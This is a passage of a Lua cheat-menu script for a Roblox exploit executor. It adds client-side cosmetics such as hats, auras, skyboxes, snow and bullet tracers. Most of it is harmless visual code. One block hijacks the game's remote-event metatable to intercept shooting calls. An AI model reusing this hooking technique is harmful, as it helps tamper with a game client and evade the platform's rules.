    Values = {"ForceField", "Neon", "Plastic", "SmoothPlastic", "Wood", "WoodPlanks", "Marble", "Slate", "Concrete", "Granite", "Brick", "Pebble", "Cobblestone", "Rock", "DiamondPlate", "Metal", "CorrodedMetal", "Foil", "Grass", "Sand", "Fabric", "Ice", "Glass", "Asphalt", "LeafyGrass", "Salt", "Snow", "Mud", "Ground", "Basalt", "CrackedLava"},
    Default = "ForceField",
    Multi = false,
    Text = "Tool Material",
})
do
getgenv().ChinaHatSettings = {
    enabled = false,
    hatColor = Color3.fromRGB(154, 125, 175),
    lightColor = Color3.fromRGB(154, 125, 175),
    lightBrightness = 1,
    lightRange = 12,
    scale = Vector3.new(1.7, 1.1, 1.7),
}

function CreateHat(Character)
    local Head = Character:FindFirstChild('Head')

    if not Head then
        return
    end

    local Cone = Instance.new('Part')

    Cone.Name = 'ChinaHat'
    Cone.Size = Vector3.new(1, 1, 1)
    Cone.BrickColor = BrickColor.new('Hot pink')
    Cone.Material = Enum.Material.Neon
    Cone.Transparency = 0.3
    Cone.Anchored = false
    Cone.CanCollide = false
    Cone.Color = getgenv().ChinaHatSettings.hatColor

    local Mesh = Instance.new('SpecialMesh')

    Mesh.MeshType = Enum.MeshType.FileMesh
    Mesh.MeshId = 'rbxassetid://1033714'
    Mesh.Scale = getgenv().ChinaHatSettings.scale
    Mesh.Parent = Cone

    local Weld = Instance.new('Weld')

    Weld.Part0 = Head
    Weld.Part1 = Cone
    Weld.C0 = CFrame.new(0, 0.9, 0)
    Weld.Parent = Cone

    local Light = Instance.new('PointLight')

    Light.Color = getgenv().ChinaHatSettings.hatColor
    Light.Brightness = getgenv().ChinaHatSettings.lightBrightness
    Light.Range = getgenv().ChinaHatSettings.lightRange
    Light.Shadows = true
    Light.Parent = Cone
    Cone.Parent = Character
end
function OnCharacterAdded1(Character)
    if getgenv().ChinaHatSettings.enabled then
        CreateHat(Character)
    end
end

LocalPlayer.CharacterAdded:Connect(OnCharacterAdded1)

if LocalPlayer.Character then
    task.wait(3)
    OnCharacterAdded1(LocalPlayer.Character)
end

CharacterTab:AddToggle('ChinaHatEnabled', {
    Text = 'China Hat',
    Default = getgenv().ChinaHatSettings.enabled,
    Callback = function(state)
        getgenv().ChinaHatSettings.enabled = state

        if state then
            if LocalPlayer.Character then
                OnCharacterAdded1(LocalPlayer.Character)
            end
        else
            if LocalPlayer.Character then
                local hat = LocalPlayer.Character:FindFirstChild('ChinaHat')

                if hat then
                    hat:Destroy()
                end
            end
        end
    end,
}):AddColorPicker('ChinaHatColor', {
    Default = getgenv().ChinaHatSettings.hatColor,
    Title = 'Hat Color',
    Callback = function(color)
        getgenv().ChinaHatSettings.hatColor = color

        if getgenv().ChinaHatSettings.enabled and LocalPlayer.Character then
            local hat = LocalPlayer.Character:FindFirstChild('ChinaHat')

            if hat then
                hat:Destroy()
            end

            CreateHat(LocalPlayer.Character)
        end
    end,
})
end
CharacterTab:AddToggle("AuraToggle", {
    Text = "Aura",
    Default = false,
    Callback = function(Value)
        letal.SelfVisuals.Aura = Value
    end
}):AddColorPicker("AuraColor", {
    Default = Color3.fromRGB(154, 125, 175),
    Title = "Aura Color",
    Callback = function(Value)
        letal.SelfVisuals.AuraColor = Value
    end
})

CharacterTab:AddToggle("WalkStepsToggle", {
    Text = "Walkstep",
    Default = false,
    Callback = function(Value)
        letal.SelfVisuals.WalkSteps = Value
    end
}):AddColorPicker("WalkStepsColor", {
    Default = Color3.fromRGB(154, 125, 175),
    Title = "Walkstep Color",
    Callback = function(Value)
        letal.SelfVisuals.WalkStepsColor = Value
    end
})

CharacterTab:AddSlider("WalkStepsRate", {
    Text = "Walkstep Rate",
    Default = 7,
    Min = 1,
    Max = 10,
    Rounding = 0,
    Callback = function(Value)
        letal.SelfVisuals.WalkStepsRate = Value
    end
})

CharacterTab:AddSlider("WalkStepsSize", {
    Text = "Walkstep Size",
    Default = 5,
    Min = 1,
    Max = 10,
    Rounding = 1,
    Callback = function(Value)
        letal.SelfVisuals.WalkStepsSize = NumberSequence.new(
            0.1 * Value, 0.25 * Value, 0.5 * Value,
            0.75 * Value, 1 * Value, 1.25 * Value,
            1.5 * Value, 1.75 * Value, 2 * Value
        )
    end
})
local run = game:GetService("RunService")
local lp = Players.LocalPlayer
local lighting = game:GetService("Lighting")
local defaultSkyData = nil
local originalSky = lighting:FindFirstChildOfClass("Sky")

if originalSky then
    defaultSkyData = {
        SkyboxBk = originalSky.SkyboxBk,
        SkyboxDn = originalSky.SkyboxDn,
        SkyboxFt = originalSky.SkyboxFt,
        SkyboxLf = originalSky.SkyboxLf,
        SkyboxRt = originalSky.SkyboxRt,
        SkyboxUp = originalSky.SkyboxUp,
        SunTextureId = originalSky.SunTextureId,
        MoonTextureId = originalSky.MoonTextureId,
        StarCount = originalSky.StarCount,
        CelestialBodiesShown = originalSky.CelestialBodiesShown
    }
end

local default_lighting = {
    ambient = lighting.Ambient,
    outdoor_ambient = lighting.OutdoorAmbient,
    exposure = lighting.ExposureCompensation,
    fog_start = lighting.FogStart,
    fog_end = lighting.FogEnd,
    fog_color = lighting.FogColor,
    brightness = lighting.Brightness,
    clock_time = lighting.ClockTime,
    global_shadows = lighting.GlobalShadows,
    technology = lighting.Technology.Name,
    sky = defaultSkyData
}

local world_settings = {
    ambient = Color3.new(155/255, 125/255, 175/255),
    outdoor_ambient = Color3.new(0, 0, 0),
    exposure = 0,
    fog_start = 0,
    fog_end = 1000,
    fog_color = Color3.new(0, 0, 0),
    brightness = 0,
    clock_time = 0,
    skybox_enabled = false,
    selected_skybox = "Sunset",
    color_correction_enabled = false,
    color_correction_brightness = 0,
    color_correction_contrast = 0,
    color_correction_saturation = 0,
    global_shadows = false,
    technology = "Legacy",
    snow_enabled = false,
}

local skyboxes = {
    ["Sunset"] = {
        SkyboxBk = "http://www.roblox.com/asset/?id=458016711",
        SkyboxDn = "http://www.roblox.com/asset/?id=458016826",
        SkyboxFt = "http://www.roblox.com/asset/?id=458016532",
        SkyboxLf = "http://www.roblox.com/asset/?id=458016655",
        SkyboxRt = "http://www.roblox.com/asset/?id=458016782",
        SkyboxUp = "http://www.roblox.com/asset/?id=458016792"
    },
    ["Night Sky 1"] = {
        SkyboxBk = "rbxassetid://48020371",
        SkyboxDn = "rbxassetid://48020144",
        SkyboxFt = "rbxassetid://48020234",
        SkyboxLf = "rbxassetid://48020211",
        SkyboxRt = "rbxassetid://48020254",
        SkyboxUp = "rbxassetid://48020383"
    },
    ["Evening"] = {
        SkyboxLf = "http://www.roblox.com/asset/?id=7950573918",
        SkyboxBk = "http://www.roblox.com/asset/?id=7950569153",
        SkyboxDn = "http://www.roblox.com/asset/?id=7950570785",
        SkyboxFt = "http://www.roblox.com/asset/?id=7950572449",
        SkyboxRt = "http://www.roblox.com/asset/?id=7950575055",
        SkyboxUp = "http://www.roblox.com/asset/?id=7950627627"
    },
    ["Purple Nebula"] = {
        SkyboxBk = "rbxassetid://159454299",
        SkyboxDn = "rbxassetid://159454296",
        SkyboxFt = "rbxassetid://159454293",
        SkyboxLf = "rbxassetid://159454286",
        SkyboxRt = "rbxassetid://159454300",
        SkyboxUp = "rbxassetid://159454288"
    },
    ["Night Sky 2"] = {
        SkyboxBk = "rbxassetid://12064107",
        SkyboxDn = "rbxassetid://12064152",
        SkyboxFt = "rbxassetid://12064121",
        SkyboxLf = "rbxassetid://12063984",
        SkyboxRt = "rbxassetid://12064115",
        SkyboxUp = "rbxassetid://12064131"
    },
    ["Pink Daylight"] = {
        SkyboxBk = "rbxassetid://271042516",
        SkyboxDn = "rbxassetid://271077243",
        SkyboxFt = "rbxassetid://271042556",
        SkyboxLf = "rbxassetid://271042310",
        SkyboxRt = "rbxassetid://271042467",
        SkyboxUp = "rbxassetid://271077958"
    },
    ["Morning Glow"] = {
        SkyboxBk = "rbxassetid://1417494030",
        SkyboxDn = "rbxassetid://1417494146",
        SkyboxFt = "rbxassetid://1417494253",
        SkyboxLf = "rbxassetid://1417494402",
        SkyboxRt = "rbxassetid://1417494499",
        SkyboxUp = "rbxassetid://1417494643"
    },
    ["Chill"] = {
        SkyboxBk = "rbxassetid://5084575798",
        SkyboxDn = "rbxassetid://5084575916",
        SkyboxFt = "rbxassetid://5103949679",
        SkyboxLf = "rbxassetid://5103948542",
        SkyboxRt = "rbxassetid://5103948784",
        SkyboxUp = "rbxassetid://5084576400"
    },
    ["Setting Sun"] = {
        SkyboxBk = "rbxassetid://626460377",
        SkyboxDn = "rbxassetid://626460216",
        SkyboxFt = "rbxassetid://626460513",
        SkyboxLf = "rbxassetid://626473032",
        SkyboxRt = "rbxassetid://626458639",
        SkyboxUp = "rbxassetid://626460625"
    },
    ["Fade Blue"] = {
        SkyboxBk = "rbxassetid://153695414",
        SkyboxDn = "rbxassetid://153695352",
        SkyboxFt = "rbxassetid://153695452",
        SkyboxLf = "rbxassetid://153695320",
        SkyboxRt = "rbxassetid://153695383",
        SkyboxUp = "rbxassetid://153695471"
    },
    ["Twilight"] = {
        SkyboxBk = "rbxassetid://264908339",
        SkyboxDn = "rbxassetid://264907909",
        SkyboxFt = "rbxassetid://264909420",
        SkyboxLf = "rbxassetid://264909758",
        SkyboxRt = "rbxassetid://264908886",
        SkyboxUp = "rbxassetid://264907379"
    },
    ["Elegant Morning"] = {
        SkyboxBk = "rbxassetid://153767241",
        SkyboxDn = "rbxassetid://153767216",
        SkyboxFt = "rbxassetid://153767266",
        SkyboxLf = "rbxassetid://153767200",
        SkyboxRt = "rbxassetid://153767231",
        SkyboxUp = "rbxassetid://153767288"
    },
    ["Neptune"] = {
        SkyboxBk = "rbxassetid://218955819",
        SkyboxDn = "rbxassetid://218953419",
        SkyboxFt = "rbxassetid://218954524",
        SkyboxLf = "rbxassetid://218958493",
        SkyboxRt = "rbxassetid://218957134",
        SkyboxUp = "rbxassetid://218950090"
    },
    ["Redshift"] = {
        SkyboxBk = "rbxassetid://401664839",
        SkyboxDn = "rbxassetid://401664862",
        SkyboxFt = "rbxassetid://401664960",
        SkyboxLf = "rbxassetid://401664881",
        SkyboxRt = "rbxassetid://401664901",
        SkyboxUp = "rbxassetid://401664936"
    },
    ["Aesthetic Night"] = {
        SkyboxBk = "rbxassetid://1045964490",
        SkyboxDn = "rbxassetid://1045964368",
        SkyboxFt = "rbxassetid://1045964655",
        SkyboxLf = "rbxassetid://1045964655",
        SkyboxRt = "rbxassetid://1045964655",
        SkyboxUp = "rbxassetid://1045962969"
    },
    -- Thêm 5 skybox cũ
    ["Black Storm"] = {
        Bk = "rbxassetid://15502511288",
        Dn = "rbxassetid://15502508460",
        Ft = "rbxassetid://15502510289",
        Lf = "rbxassetid://15502507918",
        Rt = "rbxassetid://15502509398",
        Up = "rbxassetid://15502511911"
    },
    ["Blue Space"] = {
        Bk = "rbxassetid://15536110634",
        Dn = "rbxassetid://15536112543",
        Ft = "rbxassetid://15536116141",
        Lf = "rbxassetid://15536114370",
        Rt = "rbxassetid://15536118762",
        Up = "rbxassetid://15536117282"
    },
    ["Realistic"] = {
        Bk = "rbxassetid://653719502",
        Dn = "rbxassetid://653718790",
        Ft = "rbxassetid://653719067",
        Lf = "rbxassetid://653719190",
        Rt = "rbxassetid://653718931",
        Up = "rbxassetid://653719321"
    },
    ["Stormy"] = {
        Bk = "http://www.roblox.com/asset/?id=18703245834",
        Dn = "http://www.roblox.com/asset/?id=18703243349",
        Ft = "http://www.roblox.com/asset/?id=18703240532",
        Lf = "http://www.roblox.com/asset/?id=18703237556",
        Rt = "http://www.roblox.com/asset/?id=18703235430",
        Up = "http://www.roblox.com/asset/?id=18703232671"
    },
    ["Pink"] = {
        Bk = "rbxassetid://12216109205",
        Dn = "rbxassetid://12216109875",
        Ft = "rbxassetid://12216109489",
        Lf = "rbxassetid://12216110170",
        Rt = "rbxassetid://12216110471",
        Up = "rbxassetid://12216108877"
    }
}

local snowPart = nil
local snowEmitter = nil
function createSnowEffect()
    if snowPart then return end
    snowPart = Instance.new("Part")
    snowPart.Name = "SkeetSnowEmitter"
    snowPart.Size = Vector3.new(200, 1, 200)
    snowPart.Anchored = true
    snowPart.CanCollide = false
    snowPart.Transparency = 1
    snowPart.Parent = workspace
    snowEmitter = Instance.new("ParticleEmitter")
    snowEmitter.Name = "Snow"
    snowEmitter.Texture = "rbxasset://textures/particles/smoke_main.dds"
    snowEmitter.Color = ColorSequence.new(Color3.fromRGB(255, 255, 255))
    snowEmitter.Size = NumberSequence.new({
        NumberSequenceKeypoint.new(0, 0.3),
        NumberSequenceKeypoint.new(1, 0.3)
    })
    snowEmitter.Transparency = NumberSequence.new({
        NumberSequenceKeypoint.new(0, 0),
        NumberSequenceKeypoint.new(0.8, 0.1),
        NumberSequenceKeypoint.new(1, 1)
    })
    snowEmitter.Lifetime = NumberRange.new(20, 25)
    snowEmitter.Rate = 3000
    snowEmitter.Rotation = NumberRange.new(0, 360)
    snowEmitter.RotSpeed = NumberRange.new(-50, 50)
    snowEmitter.Speed = NumberRange.new(1, 3)
    snowEmitter.SpreadAngle = Vector2.new(90, 90)
    snowEmitter.VelocityInheritance = 0
    snowEmitter.Acceleration = Vector3.new(0, -2, 0)
    snowEmitter.EmissionDirection = Enum.NormalId.Bottom
    snowEmitter.LightEmission = 0.7
    snowEmitter.LightInfluence = 0
    snowEmitter.Parent = snowPart
    run.RenderStepped:Connect(function()
        if snowPart and world_settings.snow_enabled and lp.Character then
            local hrp = lp.Character:FindFirstChild("HumanoidRootPart")
            if hrp then
                snowPart.Position = hrp.Position + Vector3.new(0, 50, 0)
            end
        end
    end)
end

function removeSnowEffect()
    if snowPart then
        snowPart:Destroy()
        snowPart = nil
        snowEmitter = nil
    end
end

run.Heartbeat:Connect(function(dt)
    if Toggles.LightningModifications.Value then  
        lighting.Ambient = world_settings.ambient
        lighting.OutdoorAmbient = world_settings.outdoor_ambient
        lighting.ExposureCompensation = world_settings.exposure
        lighting.FogStart = world_settings.fog_start
        lighting.FogEnd = world_settings.fog_end
        lighting.FogColor = world_settings.fog_color
        lighting.Brightness = world_settings.brightness
        lighting.ClockTime = world_settings.clock_time

        if world_settings.skybox_enabled then
            local sky = lighting:FindFirstChildOfClass("Sky")
            if not sky then
                sky = Instance.new("Sky")
                sky.Parent = lighting
            end
            local skybox_data = skyboxes[world_settings.selected_skybox]
            if skybox_data then
                sky.SkyboxBk = skybox_data.SkyboxBk or skybox_data.Bk
                sky.SkyboxDn = skybox_data.SkyboxDn or skybox_data.Dn
                sky.SkyboxFt = skybox_data.SkyboxFt or skybox_data.Ft
                sky.SkyboxLf = skybox_data.SkyboxLf or skybox_data.Lf
                sky.SkyboxRt = skybox_data.SkyboxRt or skybox_data.Rt
                sky.SkyboxUp = skybox_data.SkyboxUp or skybox_data.Up
            end
        end

        if world_settings.color_correction_enabled then
            local colorCorrection = lighting:FindFirstChildOfClass("ColorCorrectionEffect")
            if not colorCorrection then
                colorCorrection = Instance.new("ColorCorrectionEffect")
                colorCorrection.Name = "SkeetColorCorrection"
                colorCorrection.Parent = lighting
            end
            colorCorrection.Brightness = world_settings.color_correction_brightness / 100
            colorCorrection.Contrast = world_settings.color_correction_contrast / 100
            colorCorrection.Saturation = world_settings.color_correction_saturation / 100
        else
            local colorCorrection = lighting:FindFirstChild("SkeetColorCorrection")
            if colorCorrection then
                colorCorrection:Destroy()
            end
        end

        lighting.GlobalShadows = world_settings.global_shadows
        if world_settings.technology == "Legacy" then
            lighting.Technology = Enum.Technology.Legacy
        elseif world_settings.technology == "Voxel" then
            lighting.Technology = Enum.Technology.Voxel
        elseif world_settings.technology == "ShadowMap" then
            lighting.Technology = Enum.Technology.ShadowMap
        elseif world_settings.technology == "Future" then
            lighting.Technology = Enum.Technology.Future
        end
    end
    if letal.SelfVisuals.Character and Players.LocalPlayer.Character then
        local char = Players.LocalPlayer.Character
        if char then
            for _, part in ipairs(char:GetChildren()) do
                if part:IsA("BasePart") then
                    if not originalCharacterColors[part] then
                        originalCharacterColors[part] = {Color = part.Color, Material = part.Material}
                    end
                    part.Material = Enum.Material[Options.CharacterMaterial.Value]
                    part.Color = Options.CharacterColor.Value
                end
            end
        end
    end
    if letal.SelfVisuals.Tool and Players.LocalPlayer.Character then
        local char = Players.LocalPlayer.Character
        if char then
            local tool = char:FindFirstChildOfClass("Tool")
            if tool then
                for _, part in ipairs(tool:GetChildren()) do
                    if part:IsA("BasePart") then
                        if not originalToolColors[part] then
                            originalToolColors[part] = {Color = part.Color, Material = part.Material}
                        end
                        part.Material = Enum.Material[Options.ToolMaterial.Value]
                        part.Color = Options.ToolColor.Value
                    end
                end
            end
        end
    end
	if letal.SelfVisuals.Aura then
		if LocalPlayer.Character and LocalPlayer.Character:FindFirstChild("HumanoidRootPart") then
			local hrp = LocalPlayer.Character.HumanoidRootPart
			if hrp:FindFirstChild("bottom") then
				for _, attachment in ipairs(hrp:GetDescendants()) do
					if attachment.Name == "bottom" or attachment.Name == "fog" then
						for _, child in ipairs(attachment:GetDescendants()) do
							if child:IsA("ParticleEmitter") then
								child.Color = ColorSequence.new(letal.SelfVisuals.AuraColor)
								child.Enabled = true
							end
						end
					end
				end
			else
				local NewAura = game:GetObjects(getcustomasset("pink.rbxm"))[1]
				for _, v in ipairs(NewAura:GetChildren()) do
					v.Parent = hrp
				end
				NewAura:Destroy()
			end
		end
	else
		if LocalPlayer.Character and LocalPlayer.Character:FindFirstChild("HumanoidRootPart") then
			local hrp = LocalPlayer.Character.HumanoidRootPart
			if hrp:FindFirstChild("bottom") then
				for _, attachment in ipairs(hrp:GetDescendants()) do
					if attachment.Name == "bottom" or attachment.Name == "fog" then
						for _, child in ipairs(attachment:GetDescendants()) do
							if child:IsA("ParticleEmitter") then
								child.Enabled = false
							end
						end
					end
				end
			end
		end
	end

	-- ==================== WALKSTEP LOGIC ====================
	if letal.SelfVisuals.WalkSteps then
		if LocalPlayer.Character and LocalPlayer.Character:FindFirstChild("HumanoidRootPart") then
			local hrp = LocalPlayer.Character.HumanoidRootPart
			if hrp:FindFirstChild("Walksteps") then
				local ws = hrp:FindFirstChild("Walksteps")
				if ws:FindFirstChild("Indicator") then
					ws.Indicator.Color = ColorSequence.new(letal.SelfVisuals.WalkStepsColor)
					ws.Indicator.Rate = letal.SelfVisuals.WalkStepsRate
					ws.Indicator.Size = letal.SelfVisuals.WalkStepsSize
					ws.Indicator.Enabled = true
				end
			else
				local NewWalk = game:GetObjects(getcustomasset("WalkSteps.rbxm"))[1]
				for _, v in ipairs(NewWalk:GetChildren()) do
					v.Parent = hrp
				end
				NewWalk:Destroy()
			end
		end
	else
		if LocalPlayer.Character and LocalPlayer.Character:FindFirstChild("HumanoidRootPart") then
			local hrp = LocalPlayer.Character.HumanoidRootPart
			if hrp:FindFirstChild("Walksteps") and hrp.Walksteps:FindFirstChild("Indicator") then
				hrp.Walksteps.Indicator.Enabled = false
			end
		end
	end

end)
function ResetCharacterColors()
    local char = Players.LocalPlayer.Character
    if char then
        for part, original in pairs(originalCharacterColors) do
            if part and part:IsA("BasePart") then
                part.Color = original.Color
                part.Material = original.Material
            end
        end
        originalCharacterColors = {}
    end
end

function ResetToolColors()
    local char = Players.LocalPlayer.Character
    if char then
        local tool = char:FindFirstChildOfClass("Tool")
        if tool then
            for part, original in pairs(originalToolColors) do
                if part and part:IsA("BasePart") then
                    part.Color = original.Color
                    part.Material = original.Material
                end
            end
        end
        originalToolColors = {}
    end
end
WorldTab:AddToggle("LightningModifications", {
    Text = "Lightning Modifications",
    Default = false,
    Callback = function(Value)
        if Value == false then
            lighting.Ambient = default_lighting.ambient
            lighting.OutdoorAmbient = default_lighting.outdoor_ambient
            lighting.ExposureCompensation = default_lighting.exposure
            lighting.FogStart = default_lighting.fog_start
            lighting.FogEnd = default_lighting.fog_end
            lighting.FogColor = default_lighting.fog_color
            lighting.Brightness = default_lighting.brightness
            lighting.ClockTime = default_lighting.clock_time
            lighting.GlobalShadows = default_lighting.global_shadows
            lighting.Technology = Enum.Technology[default_lighting.technology]
            for _, v in pairs(lighting:GetChildren()) do
                if v:IsA("Sky") then
                    v:Destroy()
                end
            end

            -- KHÔI PHỤC sky gốc
            if default_lighting.sky then
                local newSky = Instance.new("Sky")
                for property, value in pairs(default_lighting.sky) do
                    newSky[property] = value
                end
                newSky.Parent = lighting
            end
            local colorCorrection = lighting:FindFirstChild("SkeetColorCorrection")
            if colorCorrection then colorCorrection:Destroy() end
            removeSnowEffect()
        end
    end
})

WorldTab:AddLabel("Ambient Color"):AddColorPicker("AmbientColor", {
    Default = Color3.new(155/255, 125/255, 175/255),
    Title = "Main",
    Callback = function(Value)
        world_settings.ambient = Value
    end
})

WorldTab:AddLabel("Custom Outdoor Ambient"):AddColorPicker("CustomOutdoorAmbientColor", {
    Default = Color3.new(0, 0, 0),
    Title = "Main",
    Callback = function(Value)
        world_settings.outdoor_ambient = Value
    end
})

WorldTab:AddSlider("ExposureCompensation", {
    Text = "Exposure Compensation",
    Default = 0,
    Min = -5,
    Max = 5,
    Rounding = 1,
    Callback = function(Value)
        world_settings.exposure = Value
    end
})

WorldTab:AddSlider("FogStart", {
    Text = "Fog Start",
    Default = 0,
    Min = 0,
    Max = 1000,
    Rounding = 0,
    Callback = function(Value)
        world_settings.fog_start = Value
    end
})

WorldTab:AddSlider("FogEnd", {
    Text = "Fog End",
    Default = 1000,
    Min = 0,
    Max = 10000,
    Rounding = 0,
    Callback = function(Value)
        world_settings.fog_end = Value
    end
})

WorldTab:AddLabel("Fog Color"):AddColorPicker("FogColor", {
    Default = Color3.new(0, 0, 0),
    Title = "Main",
    Callback = function(Value)
        world_settings.fog_color = Value
    end
})

WorldTab:AddSlider("Brightness", {
    Text = "Brightness",
    Default = 0,
    Min = 0,
    Max = 10,
    Rounding = 2,
    Callback = function(Value)
        world_settings.brightness = Value
    end
})

WorldTab:AddSlider("ClockTime", {
    Text = "Clocktime",
    Default = 0,
    Min = 0,
    Max = 24,
    Rounding = 0,
    Callback = function(Value)
        world_settings.clock_time = Value
    end
})

WorldTab:AddToggle("CustomSkyboxEnabled", {
    Text = "Custom Skybox",
    Default = false,
    Callback = function(Value)
        world_settings.skybox_enabled = Value
    end
})

WorldTab:AddDropdown("SkyboxSelected", {
    Values = {"Sunset", "Night Sky 1", "Evening", "Purple Nebula", "Night Sky 2", "Pink Daylight", "Morning Glow", "Chill", "Setting Sun", "Fade Blue", "Twilight", "Elegant Morning", "Neptune", "Redshift", "Aesthetic Night", "Black Storm", "Blue Space", "Realistic", "Stormy", "Pink"},
    Default = "Sunset",
    Multi = false,
    Text = "Skybox",
    Callback = function(Value)
        world_settings.selected_skybox = Value
    end
})

WorldTab:AddToggle("ColorCorrectionEnabled", {
    Text = "Color Correction",
    Default = false,
    Callback = function(Value)
        world_settings.color_correction_enabled = Value
    end
})

WorldTab:AddSlider("CCBrightness", {
    Text = "CC Brightness",
    Default = 0,
    Min = -100,
    Max = 100,
    Rounding = 0,
    Callback = function(Value)
        world_settings.color_correction_brightness = Value
    end
})

WorldTab:AddSlider("CCContrast", {
    Text = "CC Contrast",
    Default = 0,
    Min = -100,
    Max = 100,
    Rounding = 0,
    Callback = function(Value)
        world_settings.color_correction_contrast = Value
    end
})

WorldTab:AddSlider("CCSaturation", {
    Text = "CC Saturation",
    Default = 0,
    Min = -100,
    Max = 100,
    Rounding = 0,
    Callback = function(Value)
        world_settings.color_correction_saturation = Value
    end
})

WorldTab:AddToggle("GlobalShadows", {
    Text = "Global Shadows",
    Default = false,
    Callback = function(Value)
        world_settings.global_shadows = Value
    end
})

WorldTab:AddDropdown("LightingTechnology", {
    Values = {"Legacy", "Voxel", "ShadowMap", "Future"},
    Default = "Legacy",
    Multi = false,
    Text = "Technology",
    Callback = function(Value)
        world_settings.technology = Value
    end
})

WorldTab:AddToggle("SnowEnabled", {
    Text = "Snow Effect",
    Default = false,
    Callback = function(Value)
        world_settings.snow_enabled = Value
        if Value then
            createSnowEffect()
        else
            removeSnowEffect()
        end
    end
})
local BulletTracerGroup = Tabs.General:AddRightGroupbox('BulletTracer')
local BulletTracers = {
    Enabled = false,
    TextureID = "rbxassetid://12781852245",
    Color = Color3.new(255, 255, 255),
    Size = 0.3,
    Transparency = 0,
    TimeAlive = 3,
}

-- // Bullet Tracers
function bullettracerlol(startPos, endPos)
    local startPart = Instance.new("Part")
    startPart.Name = "BulletStart"
    startPart.Anchored = true
    startPart.CanCollide = false
    startPart.Transparency = 1
    startPart.Size = Vector3.new(0.2, 0.2, 0.2)
    startPart.Material = Enum.Material.ForceField
    startPart.Color = Color3.new(1, 0, 0)
    startPart.Transparency = 1
    startPart.CanTouch = false
    startPart.CanQuery = false
    startPart.Massless = true
    startPart.CollisionGroupId = 0
    startPart.Position = startPos
    startPart.Parent = workspace

    local endPart = Instance.new("Part")
    endPart.Name = "BulletEnd"
    endPart.Anchored = true
    endPart.CanCollide = false
    endPart.Size = Vector3.new(0.2, 0.2, 0.2)
    endPart.Material = Enum.Material.ForceField
    endPart.Color = Color3.new(1, 0, 0)
    endPart.Transparency = 1
    endPart.CanTouch = false
    endPart.CanQuery = false
    endPart.Massless = true
    endPart.CollisionGroupId = 0
    endPart.Position = endPos
    endPart.Parent = workspace

    local beam = Instance.new("Beam")
    beam.Attachment0 = Instance.new("Attachment", startPart)
    beam.Attachment1 = Instance.new("Attachment", endPart)
    beam.Parent = startPart
    beam.FaceCamera = true
    beam.Color = ColorSequence.new(BulletTracers.Color)
    beam.Texture = BulletTracers.TextureID
    beam.LightEmission = 1
    beam.Transparency = NumberSequence.new(BulletTracers.Transparency)
    beam.Width0 = BulletTracers.Size
    beam.Width1 = BulletTracers.Size

    task.delay(BulletTracers.TimeAlive, function()
        if beam and beam.Parent then
            local tweenInfo = TweenInfo.new(0.3, Enum.EasingStyle.Quad, Enum.EasingDirection.Out)
            local tween = TweenService:Create(beam, tweenInfo, { Width0 = 0, Width1 = 0 })
            tween:Play()
           
            tween.Completed:Wait()
        end

        if startPart and startPart.Parent then startPart:Destroy() end
        if endPart and endPart.Parent then endPart:Destroy() end
        if beam and beam.Parent then beam:Destroy() end
    end)

    return startPart, endPart, beam
end

if getnamecallmethod and MainEvent ~= nil then
    local mt = getrawmetatable(MainEvent)
    setreadonly(mt, false)
           
    local cloned_mt = table.clone(mt)
   
    local oldnamecall = cloned_mt.__namecall
   
    setrawmetatable(MainEvent, {
        __namecall = (function(self, ...)
            local args = { ... }
            if getnamecallmethod() == "FireServer" then
                if args[1] == "ShootGun" then
   
                    -- Bullet Tracers
                    if BulletTracers.Enabled then
                        bullettracerlol(args[3], args[4])
                    end
   
                end
            end
   
            return oldnamecall(self, unpack(args))
        end),
   
        __index = cloned_mt.__index,
        __newindex = cloned_mt.__newindex,
        __call = cloned_mt.__call,
        __tostring = cloned_mt.__tostring,
    })

end

BulletTracerGroup:AddToggle('BulletTracersEnabled', {
    Text = 'Enabled',
    Default = false,
    Callback = function(Value)
        BulletTracers.Enabled = Value
        if not getnamecallmethod then
            Library:Notify("Your executor does not support this feature")
        end
    end
}):AddColorPicker('BulletTracersColor', {
    Default = BulletTracers.Color,
    Title = 'Color',
    Callback = function(Value)
        BulletTracers.Color = Value
    end
})
local depboxtracerbullet = BulletTracerGroup:AddDependencyBox()
depboxtracerbullet:AddDropdown('BulletTracersTexture', {
    Values = {"Beam", "Lightning", "Heartrate", "Chain", "Glitch", "Swirl"},
    Default = "Beam",
    Multi = false,
    Text = 'Texture',
    Callback = function(Value)
        if Value == "Beam" then
            BulletTracers.TextureID = "rbxassetid://12781852245"
        elseif Value == "Lightning" then
            BulletTracers.TextureID = "rbxassetid://446111271"
        elseif Value == "Heartrate" then
            BulletTracers.TextureID = "rbxassetid://5830549480"
        elseif Value == "Chain" then
            BulletTracers.TextureID = "rbxassetid://9632168658"
        elseif Value == "Glitch" then
            BulletTracers.TextureID = "rbxassetid://8089467613"
        elseif Value == "Swirl" then
            BulletTracers.TextureID = "rbxassetid://5638168605"
        end
    end
})

depboxtracerbullet:AddSlider('BulletTracersSize', {
    Text = 'Size',
    Default = 0.3,
    Min = 0.1,
    Max = 3,
    Rounding = 2,
    Callback = function(Value)
        BulletTracers.Size = Value
    end
})

depboxtracerbullet:AddSlider('BulletTracersTransparency', {
    Text = 'Transparency',
    Default = 0,
    Min = 0,
    Max = 1,
    Rounding = 2,
    Callback = function(Value)
        BulletTracers.Transparency = Value
    end
})

depboxtracerbullet:AddSlider('BulletTracersTimeAlive', {
    Text = 'Time Alive',
    Default = 3,
    Min = 1,
    Max = 10,
    Rounding = 0,
    Callback = function(Value)
        BulletTracers.TimeAlive = Value
    end
})
depboxtracerbullet:SetupDependencies({
	{ Toggles.BulletTracersEnabled, true } -- We can also pass `false` if we only want our features to show when the toggle is off!
})
local HitEffectsGroupBox = Tabs.General:AddLeftGroupbox("Hit Effect")
local Workspace = game:GetService("Workspace")
local HitChamsSettings = {
    Enabled = false,
    Color = Color3.fromRGB(255, 255, 255),
    Duration = 0.5,
    Transparency = 0.3,
    Material = Enum.Material.Neon
}
local lastHitChamsTime = {}
local HitEffectModule = {
    Locals = {
        Type = {
            ["Crescent Slash"] = nil,
            ["Cosmic Explosion"] = nil,
            ["Slash"] = nil,
            ["Atomic Slash"] = nil,
            ["Blood"] = nil,
        },
    },
    Functions = {},
    Settings = {HitEffect = {Color = Color3.fromRGB(255, 255, 255)}}
}
local HitChamsFolder = Instance.new("Folder")
HitChamsFolder.Name = "HitChamsFolder"
HitChamsFolder.Parent = Workspace
do --// Crescent Slash
    local Insane = Instance.new("Part")
    Insane.Parent = ReplicatedStorage
    local Attachment = Instance.new("Attachment")
    Attachment.Name = "Attachment"
    Attachment.Parent = Insane
    HitEffectModule.Locals.Type["Crescent Slash"] = Attachment
